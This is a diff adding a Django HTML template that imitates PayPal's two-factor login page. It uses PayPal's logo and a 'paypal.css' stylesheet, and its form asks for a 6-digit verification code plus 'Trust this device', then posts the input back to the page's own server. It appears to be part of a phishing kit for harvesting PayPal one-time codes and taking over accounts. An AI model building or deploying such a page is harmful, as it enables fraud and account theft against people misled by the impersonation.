@@ -1,0 +1,60 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap"
+        rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+        rel="stylesheet">
+    <link href="{% static 'css/paypal.css' %}" rel="stylesheet">
+    <title>Document</title>
+</head>
+
+<body>
+    <div id="main" class="main " role="main">
+        <section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
+            <header>
+                <div class="corral">
+                    <div id="content" class="contentContainer">
+                        <p class="paypal-logo paypal-logo-short">
+                            <center><img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png">
+                            </center>
+                        <div style="font-family: 'PT Sans', sans-serif; font-weight: 100; text-align: center; font-size: 22px; padding-top: 10px;"
+                            class="">Enter your code</div>
+                        </p>
+            </header>
+            <form action="#" method="post" class="proceed maskable" name="login" autocomplete="off" novalidate=""><center>
+                <div style=" font-family: 'PT Sans', sans-serif; font-weight: 100; padding-bottom: 30px;" class="">We've sent a 6-digit code
+                    to xxxxxxx</div>
+                <div class="textInput">
+                      <input id="number" name="number" type="number" class="hasHelp  validateEmpty " required="required" style="width: 70%;"
+                        aria-required="true" value=""> </center>
+                </div>
+                <div class="custom-control custom-checkbox mb-3" style="padding-left: 15%;">
+                    <input type="checkbox" class="custom-control-input" id="customCheck" name="example1">
+                    <label style="font-family: 'PT Sans', sans-serif; font-weight: 100;" class="custom-control-label"
+                        for="customCheck">Trust this device</label>
+                </div>
+                <div class="actions actionsSpaced"><center><button class="button actionContinue" style="width: 70%; " type="submit" id="btnLogin"
+                        name="btnLogin" value="Login">Continue</button></center></div>
+                <div class="forgotLink"><a href="#" id="forgotPasswordModal"
+                        class="scTrack:unifiedlogin-click-forgot-password">Having trouble logging in?</a></div><input
+                    type="hidden" id="bp_mid" name="bp_mid" value="">
+            </form>
+        </div>
+        </section>
+    </div>
+
+
+
+</body>
+
+</html>
